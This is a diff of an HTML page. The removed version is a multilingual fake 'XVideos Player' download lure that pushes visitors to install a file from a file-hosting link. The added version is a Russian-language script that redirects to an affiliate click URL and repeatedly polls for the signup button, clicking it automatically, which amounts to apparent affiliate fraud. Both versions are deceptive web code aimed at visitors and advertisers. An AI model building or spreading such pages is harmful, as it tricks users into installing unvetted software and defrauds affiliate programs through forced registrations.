@@ -1,221 +1,27 @@
-<!doctype html>
-<html lang="en">
-
+<!DOCTYPE html>
+<html lang="ru">
 <head>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Language" content="en">
-    <meta name="google" content="translate: no">
-    <title>XVideos</title>
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            font-family: Arial, sans-serif, system-ui;
-            background: linear-gradient(to bottom, #000000, #1a1a1a);
-            color: #fff;
-            overflow-x: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            position: relative;
-        }
-
-        #container {
-            width: 90%;
-            max-width: 900px;
-            background: rgba(30, 30, 30, 0.95);
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.9);
-            text-align: center;
-            margin: 20px 0;
-        }
-
-        .heading {
-            font-size: 28px;
-            font-weight: bold;
-            color: #ff4500;
-            text-shadow: 2px 2px 10px #000;
-            margin-bottom: 20px;
-        }
-
-        .subheading {
-            font-size: 20px;
-            color: #ffcc00;
-            margin-bottom: 20px;
-        }
-
-        .image-container img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            margin: 20px 0;
-            cursor: pointer;
-        }
-
-        .download-button {
-            font-size: 18px;
-            color: #fff;
-            background-color: #ff4500;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 8px;
-            cursor: pointer;
-            text-decoration: none;
-            margin-top: 20px;
-            display: inline-block;
-        }
-
-        .download-button:hover {
-            background-color: #ff6347;
-        }
-    </style>
-    <script>
-        // Function to detect the user's browser language and display appropriate content
-        function detectLanguage() {
-            const userLang = navigator.language || navigator.userLanguage; // Get the user's browser language
-            const languageMap = {
-                'en': {
-                    'heading': 'Exclusive Video Player with 490000+ Videos by categories',
-                    'subheading': 'WATCH EVEN WITHOUT INTERNET',
-                    'button': 'INSTALL AND WATCH FOR FREE!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'es': {
-                    'heading': 'Reproductor de Video Exclusivo con 490000+ Videos por categorías',
-                    'subheading': 'MIRA INCLUSO SIN INTERNET',
-                    'button': '¡INSTALA Y MIRA GRATIS!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'ru': {
-                    'heading': 'Эксклюзивный Видео Плеер с 490000+ Видео по категориям',
-                    'subheading': 'СМОТРИ ДАЖЕ БЕЗ ИНТЕРНЕТА',
-                    'button': 'УСТАНОВИ И СМОТРИ БЕСПЛАТНО!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'fr': {
-                    'heading': 'Lecteur Vidéo Exclusif avec 490000+ Vidéos par catégories',
-                    'subheading': 'REGARDEZ MÊME SANS INTERNET',
-                    'button': 'INSTALLEZ ET REGARDEZ GRATUITEMENT!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'de': {
-                    'heading': 'Exklusiver Video Player mit 490000+ Videos nach Kategorien',
-                    'subheading': 'SCHAU SOGAR OHNE INTERNET',
-                    'button': 'INSTALLIEREN UND FÜR KOSTENLOS ANSCHAUEN!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'it': {
-                    'heading': 'Video Player Esclusivo con 490000+ Video per categorie',
-                    'subheading': 'GUARDA ANCHE SENZA INTERNET',
-                    'button': 'INSTALLA E GUARDA GRATIS!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'pt': {
-                    'heading': 'Reprodutor de Vídeo Exclusivo com 490000+ Vídeos por categorias',
-                    'subheading': 'ASSISTA MESMO SEM INTERNET',
-                    'button': 'INSTALE E ASSISTA GRÁTIS!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'zh-CN': {
-                    'heading': '独家视频播放器，提供490000+个按类别的视频',
-                    'subheading': '即使没有互联网也能观看',
-                    'button': '安装并免费观看！',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'ko': {
-                    'heading': '490000+ 개의 카테고리별 비디오가 있는 독점 비디오 플레이어',
-                    'subheading': '인터넷 없이도 시청하세요',
-                    'button': '설치하고 무료로 시청하세요!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'ja': {
-                    'heading': '490000+ カテゴリ別の動画を提供する独占動画プレーヤー',
-                    'subheading': 'インターネットなしで視聴可能',
-                    'button': 'インストールして無料で視聴！',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'hi': {
-                    'heading': '490000+ वीडियो श्रेणियों के अनुसार एक्ज़क्लूसिव वीडियो प्लेयर',
-                    'subheading': 'इंटरनेट के बिना भी देखें',
-                    'button': 'इंस्टॉल करें और फ्री में देखें!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'ar': {
-                    'heading': 'مشغل الفيديو الحصري مع 490000+ فيديو حسب الفئات',
-                    'subheading': 'شاهد حتى بدون الإنترنت',
-                    'button': 'قم بالتثبيت وشاهد مجاناً!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'bn': {
-                    'heading': '490000+ ভিডিও ক্যাটেগরিতে এক্সক্লুসিভ ভিডিও প্লেয়ার',
-                    'subheading': 'ইন্টারনেট ছাড়া দেখুন',
-                    'button': 'ইনস্টল করুন এবং ফ্রি দেখুন!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'tr': {
-                    'heading': '490000+ Video Kategorileriyle Eksklizif Video Oynatıcı',
-                    'subheading': 'İnternet olmadan bile izleyin',
-                    'button': 'Ücretsiz Yükle ve İzle!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'pl': {
-                    'heading': 'Ekskluzywny Odtwarzacz Wideo z 490000+ Wideo według Kategorii',
-                    'subheading': 'Oglądaj nawet bez internetu',
-                    'button': 'Zainstaluj i oglądaj za darmo!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                },
-                'cs': {
-                    'heading': 'Exkluzivní Video Přehrávač s 490000+ Videí podle kategorií',
-                    'subheading': 'Sledujte i bez internetu',
-                    'button': 'Nainstalujte a sledujte zdarma!',
-                    'downloadLink': 'https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player'
-                }
-            };
-
-            // Default to English if the language is not in the map
-            const language = languageMap[userLang.substring(0, 2)] || languageMap['en'];
-
-            // Update content dynamically based on the detected language
-            document.getElementById('heading').innerText = language.heading;
-            document.getElementById('subheading').innerText = language.subheading;
-            document.getElementById('download-button').innerText = language.button;
-            document.getElementById('download-button').href = language.downloadLink;
-        }
-
-        // Run the detectLanguage function when the page loads
-        window.onload = detectLanguage;
-    </script>
+    <title>Переход и клик на регистрацию</title>
 </head>
-
 <body>
-    <div id="container">
-        <!-- First Image with link -->
-        <div class="image-container">
-            <a href="https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player" target="_blank" rel="noopener noreferrer">
-                <img src="ai_bot.png" alt="AI Bot" />
-            </a>
-        </div>
+    <script type="text/javascript">
+        window.onload = function() {
+            // Переход по партнерской ссылке
+            window.location.href = "https://offer.affimelody.com/click?pid=118208&offer_id=531";
 
-        <!-- Heading and Description -->
-        <div class="heading" id="heading">Exclusive Video Player with 490000+ Videos by categories</div>
-        <div class="subheading" id="subheading">WATCH EVEN WITHOUT INTERNET</div>
-
-        <!-- Download Button with dynamic link -->
-        <a href="#" class="download-button" id="download-button" target="_blank" rel="noopener noreferrer">
-            INSTALL AND WATCH FOR FREE!
-        </a>
-
-        <!-- Second Image with link -->
-        <div class="image-container">
-            <a href="https://ikx.filexspace.com/getfile/UOHHO?title=XVideos%20Player" target="_blank" rel="noopener noreferrer">
-                <img src="ai_botfull.png" alt="AI Bot Full" />
-            </a>
-        </div>
-    </div>
+            // Проверяем наличие кнопки регистрации каждые 500 миллисекунд
+            var checkButtonInterval = setInterval(function() {
+                var registerButton = document.querySelector('a.join_btn[rel="signup"]');
+                
+                // Если кнопка найдена, кликаем по ней и останавливаем проверку
+                if (registerButton) {
+                    registerButton.click();
+                    clearInterval(checkButtonInterval);  // Останавливаем проверку
+                }
+            }, 500); // Проверка каждые 500 миллисекунд
+        };
+    </script>
 </body>
-
 </html>
